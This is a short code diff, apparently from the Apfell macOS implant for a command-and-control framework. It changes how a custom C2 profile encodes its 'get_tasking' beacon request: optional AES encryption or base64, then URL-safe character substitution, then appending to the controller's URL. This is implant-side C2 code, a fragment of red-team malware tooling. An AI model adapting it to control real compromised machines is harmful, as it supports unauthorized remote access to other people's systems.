@@ -352,13 +352,13 @@ class customC2 extends baseC2{
 	htmlGetData(){
 		let data = {"tasking_size":1, "action": "get_tasking"};
 		if(this.aes_psk !== ""){
-			data = this.encrypt_message(apfell.id, JSON.stringify(data)).js;
+			data = this.encrypt_message(apfell.id, JSON.stringify(data));
 		}else{
 			data = $(apfell.id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
-			data = data.base64EncodedStringWithOptions(0).js;
+			data = data.base64EncodedStringWithOptions(0);
 		}
-		let NSCharacterSet = $.NSCharacterSet.characterSetWithCharactersInString("/+=\n").invertedSet;
-		data = $(data).stringByAddingPercentEncodingWithAllowedCharacters(NSCharacterSet).js;
+		data = data.stringByReplacingOccurrencesOfStringWithString($("/"), $("_"))
+		data = data.stringByReplacingOccurrencesOfStringWithString($("+"), $("-")).js
 		let url = this.baseurl;
 		if(this.getURI !== ""){ url += "/" + this.getURI; }
 		url += "?" + this.queryPathName + "=" + data;
